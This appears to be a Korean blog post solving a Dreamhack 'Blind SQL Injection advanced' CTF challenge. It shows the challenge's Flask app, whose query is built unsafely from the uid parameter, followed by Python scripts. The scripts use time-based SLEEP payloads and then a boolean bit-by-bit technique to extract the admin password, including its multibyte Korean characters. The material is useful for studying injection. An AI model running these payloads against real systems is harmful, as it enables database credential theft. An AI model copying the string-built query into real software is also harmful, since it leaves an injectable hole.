---
title: "[2025-07-15] Blind SQL Injection advanced"
excerpt: "SQL Injection"

categories:
  - Problem
tags:
  - [SQL Injection]

permalink: /Problem/[2025-07-15] Blind SQL Injection advanced/

toc: true
toc_sticky: true

date: 2025-07-15
last_modified_at: 2025-07-15
---

## 🦥 본문

```python
import os
from flask import Flask, request, render_template_string
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'user_db')
mysql = MySQL(app)


@app.route('/', methods=['GET'])
def index():
    uid = request.args.get('uid', '')
    nrows = 0

    if uid:
        cur = mysql.connection.cursor()
        nrows = cur.execute(f"SELECT * FROM users WHERE uid='{uid}';")

    return render_template_string(template, uid=uid, nrows=nrows)

if __name__ == '__main__':
    app.run(host='0.0.0.0')

```

- 였고 init.sql 을 보니 admin의 upw가 Flag였다. 길이부터 알기위해서

```c
import requests
import time

# 타겟 URL 설정
URL = "http://host3.dreamhack.games:21066/"

# 비밀번호의 최대 길이를 추측하는 범위 (1부터 50까지)
MAX_LENGTH = 100

def find_password_length():
    for length in range(1, MAX_LENGTH + 1):
        payload = f"admin' AND IF(LENGTH(upw)={length}, SLEEP(5), 0)-- "
        start_time = time.time()

        response = requests.get(URL, params={'uid': payload})
        elapsed_time = time.time() - start_time

        if elapsed_time >= 4:
            print(f"[+] Found password length: {length}")
            return length

    print("[-] Could not determine password length.")
    return None

if __name__ == "__main__":
    find_password_length()

```

- 위 코드를 사용해 보니 27자 였다.

```c
import requests
import time
import string

# 타겟 URL 설정 (DreamHack 서버)
URL = "http://host3.dreamhack.games:21066/"

# 사용할 문자 집합 (ASCII)
CHARSET = string.ascii_letters + string.digits + string.punctuation  # 모든 ASCII 문자 포함

# 비밀번호 길이 (이미 알아낸 값)
PASSWORD_LENGTH = 27

def find_password():
    password = ""
    for position in range(1, PASSWORD_LENGTH + 1):
        for char in CHARSET:
            payload = f"admin' AND IF(SUBSTRING(upw,{position},1)='{char}', SLEEP(5), 0)-- "
            start_time = time.time()
            
            # 요청 보내기
            response = requests.get(URL, params={'uid': payload})
            elapsed_time = time.time() - start_time

            # 응답 시간이 5초 이상이면 맞는 문자임
            if elapsed_time >= 5:
                password += char
                print(f"[+] Found character at position {position}: {char}")
                break

    print(f"\n[+] Password found: {password}")
    return password

if __name__ == "__main__":
    find_password()

```

- 이 코드를 사용해봤는 데 1,2,3,11,12,13번째만 출력해줬다.
- 또 시간이 말도 안되게 오래 걸려서 다른 방법을 찾아보았다. 또한 13번째에서 }까지 나와서 27자가 아닌 거 같아서 검색하여 찾아보았다.

### 풀이

- 길이를 알아내는 코드

```python
from requests import get

host = "http://localhost:5000"

password_length = 0
while True:
    password_length += 1
    query = f"admin' and char_length(upw) = {password_length}-- -"
    r = get(f"{host}/?uid={query}")
    if "exists" in r.text:
        break
print(f"password length: {password_length}")
```

- 위의 코드를 사용했는 데 13자가 나온 것이었다….
- 한글은 유니코드로 3바이트라 원래보다 크게 나온 것이다.. 또한 비트 단위로 쪼개서 나누니 아스키인지 한글인지 구분할 수 있었고 시간도 훨씬 빨랐다.

```c
from requests import get
 
host = "http://host3.dreamhack.games:16736/"
 
password_length = 13
password = ""
for i in range(1, password_length + 1):
    bit_length = 0
    while True:
        bit_length += 1
        query = f"admin' and length(bin(ord(substr(upw, {i}, 1)))) = {bit_length}-- -"
        r = get(f"{host}/?uid={query}")
        if "exists" in r.text:
            break
    print(f"character {i}'s bit length: {bit_length}")
    
    bits = ""
    for j in range(1, bit_length + 1):
        query = f"admin' and substr(bin(ord(substr(upw, {i}, 1))), {j}, 1) = '1'-- -"
        r = get(f"{host}/?uid={query}")
        if "exists" in r.text:
            bits += "1"
        else:
            bits += "0"
    print(f"character {i}'s bits: {bits}")
 
    password += int.to_bytes(int(bits, 2), (bit_length + 7) // 8, "big").decode("utf-8")
 
print(password)
```